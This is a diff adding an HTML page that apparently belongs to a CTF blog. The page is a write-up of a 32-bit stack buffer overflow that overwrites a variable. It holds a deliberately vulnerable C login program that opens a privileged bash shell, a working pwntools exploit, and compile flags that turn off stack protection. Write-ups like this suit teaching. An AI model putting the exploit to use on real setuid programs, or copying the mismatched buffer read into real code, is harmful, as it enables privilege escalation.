@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure System: Buffer Overflow Variable Overwrite | S1GK1LL</title>
+    <meta name="description" content="Writeup for secure_system buffer overflow challenge - simple variable overwrite exploitation">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&family=JetBrains+Mono:wght@400;700&family=Crimson+Text:ital,wght@0,400;0,600;1,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <style>
+        /* Responsive additions */
+        @media (max-width: 768px) {
+            .writeup-content {
+                padding: 0 1rem;
+            }
+            
+            .writeup-title {
+                font-size: 1.75rem;
+                line-height: 1.3;
+            }
+            
+            .writeup-meta {
+                flex-wrap: wrap;
+                gap: 0.5rem;
+            }
+            
+            .writeup-tags {
+                flex-wrap: wrap;
+            }
+            
+            .terminal-body pre {
+                font-size: 0.8rem;
+                overflow-x: auto;
+                white-space: pre-wrap;
+                word-wrap: break-word;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .mobile-menu-btn {
+                display: block;
+            }
+        }
+        
+        @media (min-width: 769px) {
+            .mobile-menu-btn {
+                display: none;
+            }
+        }
+        
+        /* Code block styling */
+        .code-block {
+            background: var(--bg-terminal);
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 1.5rem 0;
+        }
+        
+        .code-header {
+            background: var(--bg-terminal-header);
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .code-body {
+            padding: 1rem;
+            overflow-x: auto;
+        }
+        
+        .code-body pre {
+            margin: 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-primary);
+        }
+        
+        /* Syntax highlighting */
+        .c-preproc { color: #c586c0; }
+        .c-type { color: #4ec9b0; }
+        .c-func { color: #dcdcaa; }
+        .c-string { color: #ce9178; }
+        .c-comment { color: #6a9955; }
+        .c-keyword { color: #569cd6; }
+        .c-number { color: #b5cea8; }
+    </style>
+</head>
+<body class="bg-pattern">
+
+    <nav class="nav-container">
+        <div class="nav-inner">
+            <a href="/" class="logo">
+                <div class="logo-icon"><span>殺</span></div>
+                S1GK1LL
+            </a>
+            <button class="mobile-menu-btn" onclick="toggleMobileMenu()">
+                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M4 6h16M4 12h16M4 18h16"/>
+                </svg>
+            </button>
+            <ul class="nav-links">
+                <li><a href="/">Home</a></li>
+                <li><a href="/writeups/" class="active">Writeups</a></li>
+                <li><a href="/Cyber Journal.html">Cyber Journal</a></li>
+                <li><a href="/tools.html">Tools</a></li>
+                <li><a href="/about.html">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <main>
+        <article class="writeup-content">
+            <header class="writeup-header">
+                <div class="writeup-meta">
+                    <span class="post-category">Pwn</span>
+                    <span class="post-date">March 12, 2026</span>
+                    <span style="color: var(--text-muted);">5 min read</span>
+                </div>
+                
+                <h1 class="writeup-title">Secure System: Buffer Overflow Variable Overwrite</h1>
+                
+                <div class="writeup-tags">
+                    <span class="writeup-tag">buffer-overflow</span>
+                    <span class="writeup-tag">stack</span>
+                    <span class="writeup-tag">32-bit</span>
+                    <span class="writeup-tag">variable-overwrite</span>
+                </div>
+            </header>
+
+            <div class="writeup-body">
+                <h2>Vulnerable Code</h2>
+                <div class="code-block">
+                    <div class="code-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span style="color: var(--text-muted); font-size: 0.85rem;">secure_system.c</span>
+                    </div>
+                    <div class="code-body">
+<pre><span class="c-preproc">#include &lt;unistd.h&gt;</span>
+<span class="c-preproc">#include &lt;sys/types.h&gt;</span>
+<span class="c-preproc">#include &lt;stdlib.h&gt;</span>
+<span class="c-preproc">#include &lt;stdio.h&gt;</span>
+
+<span class="c-type">int</span> <span class="c-func">main</span>()
+{
+    <span class="c-type">char</span> username[<span class="c-number">32</span>];
+
+    <span class="c-comment">/* security variable */</span>
+    <span class="c-type">int</span> access_granted = <span class="c-number">0</span>;
+
+    <span class="c-func">printf</span>(<span class="c-string">"=== SECURE SYSTEM LOGIN ===\n"</span>);
+    <span class="c-func">printf</span>(<span class="c-string">"Enter username: "</span>);
+
+    <span class="c-comment">/* Vulnerability: reading more than buffer size */</span>
+    <span class="c-func">fgets</span>(username, <span class="c-number">64</span>, stdin);
+
+    <span class="c-func">printf</span>(<span class="c-string">"\nUser entered: %s\n"</span>, username);
+    <span class="c-func">printf</span>(<span class="c-string">"Access flag value: 0x%x\n"</span>, access_granted);
+
+    <span class="c-keyword">if</span>(access_granted == <span class="c-number">0</span>)
+    {
+        <span class="c-func">printf</span>(<span class="c-string">"Access denied ❌\n"</span>);
+    }
+
+    <span class="c-keyword">if</span>(access_granted == <span class="c-number">0x1337</span>)
+    {
+        <span class="c-func">printf</span>(<span class="c-string">"\n🔥 SECURITY BYPASSED 🔥\n"</span>);
+        <span class="c-func">printf</span>(<span class="c-string">"Access granted. Opening admin shell...\n"</span>);
+
+        <span class="c-func">setreuid</span>(<span class="c-func">geteuid</span>(), <span class="c-func">geteuid</span>());
+        <span class="c-func">system</span>(<span class="c-string">"/bin/bash"</span>);
+    }
+
+    <span class="c-keyword">return</span> <span class="c-number">0</span>;
+}</pre>
+                    </div>
+                </div>
+
+                <h2>The Bug</h2>
+                <p>
+                    Classic mistake. Buffer holds 32 bytes, but <code>fgets</code> is allowed to read 64. 
+                    That gives us 32 extra bytes to play with. The developer probably copy-pasted the buffer size 
+                    into the <code>fgets</code> call without thinking, or changed one and forgot the other.
+                </p>
+
+                <h2>How the stack looks</h2>
+                <p>
+                    Since <code>username</code> is declared first and the stack grows down, <code>access_granted</code> 
+                    sits right above it in memory:
+                </p>
+
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span class="terminal-title">stack layout</span>
+                    </div>
+                    <div class="terminal-body">
+<pre>[username: 32 bytes][access_granted: 4 bytes]</pre>
+                    </div>
+                </div>
+
+                <p>
+                    Fill the username field completely and you land exactly at the start of <code>access_granted</code>. 
+                    No guessing offsets needed—it's clean.
+                </p>
+
+                <h2>The exploit</h2>
+                <p>
+                    We need to hit <code>access_granted</code> with <code>0x1337</code>. On x86 that's little-endian, 
+                    so the bytes are <code>37 13 00 00</code>.
+                </p>
+
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span class="terminal-title">exploit.py</span>
+                    </div>
+                    <div class="terminal-body">
+<pre><span class="syntax-keyword">from</span> pwn <span class="syntax-keyword">import</span> *
+
+p = process(<span class="syntax-string">'./secure_system'</span>)
+
+payload = <span class="syntax-string">b'A'</span> * <span class="syntax-number">32</span>          <span class="syntax-comment"># fill the buffer</span>
+payload += p32(<span class="syntax-number">0x1337</span>)        <span class="syntax-comment"># overwrite the flag</span>
+
+p.sendline(payload)
+p.interactive()</pre>
+                    </div>
+                </div>
+
+                <p>That's it. Run it, you get a shell.</p>
+
+                <h2>Building it yourself</h2>
+                <p>If you want to compile from source:</p>
+
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span class="terminal-title">compile</span>
+                    </div>
+                    <div class="terminal-body">
+<pre>gcc -m32 -fno-stack-protector -no-pie -o secure_system secure_system.c</pre>
+                    </div>
+                </div>
+
+                <p>You'll need 32-bit libs if you're on x64:</p>
+
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div class="terminal-btn red"></div>
+                        <div class="terminal-btn yellow"></div>
+                        <div class="terminal-btn green"></div>
+                        <span class="terminal-title">install deps</span>
+                    </div>
+                    <div class="terminal-body">
+<pre>sudo apt install gcc-multilib</pre>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">⚙️ Compile flags</div>
+                    <ul style="margin: 0; padding-left: 1.2rem;">
+                        <li><code>-m32</code> — 32-bit target</li>
+                        <li><code>-fno-stack-protector</code> — no canaries</li>
+                        <li><code>-no-pie</code> — fixed base address</li>
+                    </ul>
+                </div>
+
+                <h2>Why this works</h2>
+                <p>
+                    The program reads 36 bytes total (32 padding + 4 for the overwrite). <code>fgets</code> doesn't care 
+                    that <code>username</code> can only hold 32—it just writes where it's told. The extra 4 bytes spill 
+                    into <code>access_granted</code>, flipping it from <code>0</code> to <code>0x1337</code>. The check 
+                    passes, <code>setreuid</code> bumps your privileges, and you drop into bash.
+                </p>
+
+                <div class="flag-box">
+                    <div class="flag-label">Result</div>
+                    <div class="flag-content">
+                        🔥 SECURITY BYPASSED 🔥<br>
+                        Access granted. Opening admin shell...
+                    </div>
+                </div>
+
+                <h2>Key takeaways</h2>
+                <ul>
+                    <li>Always match your buffer size with your read size—<code>fgets</code> isn't magic</li>
+                    <li>Stack layout matters: declaration order = memory order on x86</li>
+                    <li>Little-endian means flipping bytes when you write exploits</li>
+                    <li>Real binaries have canaries, ASLR, NX—this is just the basics</li>
+                </ul>
+            </div>
+
+            <div style="margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border-subtle); display: flex; justify-content: space-between; flex-wrap: wrap; gap: 1rem;">
+                <a href="/writeups/" style="color: var(--text-secondary); text-decoration: none;">← Back to Writeups</a>
+                <a href="/writeups/pietime.html" style="color: var(--accent-gold); text-decoration: none;">Next: pietime →</a>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>S1GK1LL</h4>
+                <p>Cybersecurity Cyber Journal and CTF archive</p>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 S1GK1LL | 殺</p>
+        </div>
+    </footer>
+
+    <script src="/js/main.js"></script>
+</body>
+</html>
